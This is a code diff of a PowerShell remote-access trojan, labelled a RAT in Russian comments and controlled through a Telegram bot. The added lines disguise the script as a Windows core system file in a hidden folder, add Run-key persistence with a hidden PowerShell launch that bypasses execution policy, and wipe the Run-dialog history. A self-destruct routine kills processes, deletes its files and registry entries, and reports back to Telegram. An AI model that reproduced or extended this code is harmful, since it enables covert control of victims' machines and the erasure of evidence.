@@ -111,43 +111,27 @@ function Compress-Folder {
     }
 }
 
-# Уникальная установка - маскировка под системный процесс
-$uniqueName = "RuntimeBroker_" + (Get-Random -Minimum 1000 -Maximum 9999)
-$scriptPath = "$env:APPDATA\Microsoft\Windows\NetworkCache\$uniqueName.ps1"
-$batPath = "$env:APPDATA\Microsoft\Windows\NetworkCache\$uniqueName.bat"
+# Уникальное имя файла для скрытности (имитация системного файла)
+$uniqueName = "Windows_Core_System_" + (Get-Date).ToString("yyyyMMdd") + ".exe"
+$scriptPath = "$env:USERPROFILE\AppData\Local\Microsoft\WindowsCore\$uniqueName"
+$scriptDir = "$env:USERPROFILE\AppData\Local\Microsoft\WindowsCore"
 
-# Создание BAT файла для запуска PowerShell скрипта
-$batContent = "@echo off`npowershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-$batContent | Out-File -FilePath $batPath -Encoding ASCII
-
-# Копирование скрипта
-$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
-$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
-
-# Установка в несколько мест автозагрузки
-$regPaths = @(
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
-    "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
-)
-
-foreach ($regPath in $regPaths) {
-    try {
-        if (!(Test-Path $regPath)) { 
-            New-Item -Path $regPath -Force | Out-Null 
-        }
-        if ($regPath -like "*Windows NT*") {
-            Set-ItemProperty -Path $regPath -Name "Load" -Value $batPath -Force -ErrorAction SilentlyContinue
-        } else {
-            Set-ItemProperty -Path $regPath -Name $uniqueName -Value $batPath -Force -ErrorAction SilentlyContinue
-        }
-    } catch { }
+# Создание директории если не существует
+if (!(Test-Path $scriptDir)) { 
+    New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
+    # Установка скрытого атрибута
+    Set-ItemProperty -Path $scriptDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
 }
 
-# Очистка истории RUN после установки
-try {
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
-} catch { }
+# Установка в автозагрузку
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
+$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
+Set-ItemProperty -Path $regPath -Name "WindowsCoreSystem" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
+
+# Очистка истории RUN при установке
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
 
 # Основные переменные
 $currentDir = "C:\"
@@ -244,70 +228,53 @@ $($fileList -join "`n")"
                             }
                         }
                         "^/selfdestruct$" {
-                            # РЕАЛЬНО РАБОТАЮЩАЯ ФУНКЦИЯ САМОУНИЧТОЖЕНИЯ
-                            $report = "🔄 Начинаю реальное самоуничтожение...`n"
-                            
-                            # 1. Создаем VBS скрипт для удаления файлов после завершения процесса
-                            $vbsScript = @"
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set WshShell = CreateObject("WScript.Shell")
-
-' Ждем завершения процесса
-WScript.Sleep 5000
-
-' Удаляем файлы
+                            # Создание VBS скрипта для самоуничтожения
+                            $vbsContent = @"
 On Error Resume Next
+Set WshShell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+' Ожидание завершения PowerShell процессов
+WScript.Sleep 3000
+
+' Завершение всех процессов PowerShell связанных с RAT
+WshShell.Run "taskkill /f /im powershell.exe", 0, True
+WshShell.Run "taskkill /f /im wscript.exe", 0, True
+
+' Удаление файлов RAT
 fso.DeleteFile "$scriptPath", True
-fso.DeleteFile "$batPath", True
 fso.DeleteFile "$($MyInvocation.MyCommand.Path)", True
 
-' Очищаем реестр
-WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\$uniqueName\"
-WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run\$uniqueName\"
-WshShell.RegDelete "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load\"
+' Удаление директории если пустая
+If fso.FolderExists("$scriptDir") Then
+    If fso.GetFolder("$scriptDir").Files.Count = 0 And fso.GetFolder("$scriptDir").SubFolders.Count = 0 Then
+        fso.DeleteFolder "$scriptDir", True
+    End If
+End If
 
-' Очищаем историю RUN
-WshShell.Run "cmd /c reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f", 0, True
+' Очистка реестра
+WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsCoreSystem"
+WshShell.Run "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f", 0, True
 
-' Удаляем сам VBS скрипт
+' Отправка отчета в Telegram
+Set http = CreateObject("MSXML2.ServerXMLHTTP")
+http.Open "POST", "https://api.telegram.org/bot$Token/sendMessage", False
+http.setRequestHeader "Content-Type", "application/json"
+http.Send "{""chat_id"": ""$ChatID"", ""text"": ""✅ RAT успешно самоуничтожен. Все следы удалены: файлы, процессы, записи реестра.""}"
+
+' Самоуничтожение VBS скрипта
 fso.DeleteFile WScript.ScriptFullName, True
 "@
 
-                            $vbsPath = [System.IO.Path]::GetTempFileName() + ".vbs"
-                            $vbsScript | Out-File -FilePath $vbsPath -Encoding ASCII
-
-                            # 2. Запускаем VBS скрипт
-                            $vbsProcess = Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden -PassThru
+                            $vbsPath = "$env:TEMP\cleanup_" + (Get-Random) + ".vbs"
+                            $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
                             
-                            # 3. Очищаем реестр немедленно
-                            try {
-                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $uniqueName -Force -ErrorAction SilentlyContinue
-                                $report += "✅ Автозагрузка Run очищена`n"
-                            } catch { $report += "❌ Ошибка Run`n" }
+                            # Запуск VBS скрипта
+                            $process = Start-Process -FilePath "wscript.exe" -ArgumentList "//B `"$vbsPath`"" -PassThru -WindowStyle Hidden
                             
-                            try {
-                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name $uniqueName -Force -ErrorAction SilentlyContinue
-                                $report += "✅ Автозагрузка StartupApproved очищена`n"
-                            } catch { $report += "❌ Ошибка StartupApproved`n" }
-                            
-                            try {
-                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "Load" -Force -ErrorAction SilentlyContinue
-                                $report += "✅ Автозагрузка Windows NT очищена`n"
-                            } catch { $report += "❌ Ошибка Windows NT`n" }
-                            
-                            try {
-                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
-                                $report += "✅ История RUN очищена`n"
-                            } catch { $report += "❌ Ошибка истории RUN`n" }
-
-                            $report += "`n🗑️ Файлы будут удалены через 5 секунд..."
-                            $report += "`n⚠️ RAT завершает работу..."
-
-                            Send-Telegram $report
-                            
-                            # 4. Немедленно завершаем работу
-                            Start-Sleep -Seconds 2
-                            Stop-Process -Id $PID -Force
+                            Send-Telegram "🔄 Запущен процесс самоуничтожения RAT..."
+                            Start-Sleep 2
+                            exit
                         }
                     }
                 }
